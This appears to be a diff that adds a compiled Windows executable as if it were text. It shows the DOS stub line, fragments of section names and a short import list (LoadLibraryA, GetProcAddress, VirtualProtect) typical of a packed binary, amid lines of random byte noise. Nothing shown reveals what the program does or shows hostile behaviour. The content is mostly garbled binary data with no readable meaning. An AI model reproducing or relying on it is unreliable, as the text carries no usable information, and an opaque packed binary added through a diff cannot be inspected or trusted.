@@ -1,0 +1,50 @@
+!This program cannot be run in DOS mode.
+Np!;n
+PSQRVW
+_^ZY[X]
+n_0H@s*
+ /;$4,
+Y:ZV"=Z
+^V"=^O
+bV"="9r
+lvfV"=fA6;
+&'jV"=H
+6rVG.9
+N$vV"=v'
+f"=zTX
+g"ir~r
+{HfC>:5
+O-K!(A
+B2@t2j
+4a1[H`
+9>u~9N
+<+G8yn
+SWdyIm*@CWV|G
+RRJ1#b|y
+`n2n6n6
+OR[`dd
+;gp0p4p4
+-[(:soo\
+I.text
+{$mn#`
+ idata$5
+UBMQ7?
+p}\O`g)
+ l?[ZP
+^>EXl%
+ .?}Z-
+P 8B;|
+?.XV[*
+\$B*KWo
+$gO'wm
+GetModuleHand
+ProcAddress
+LoadLi
+; A" M
+Qyr'G._
+XPTPSW
+KERNEL32.DLL
+ExitProcess
+GetProcAddress
+LoadLibraryA
+VirtualProtect
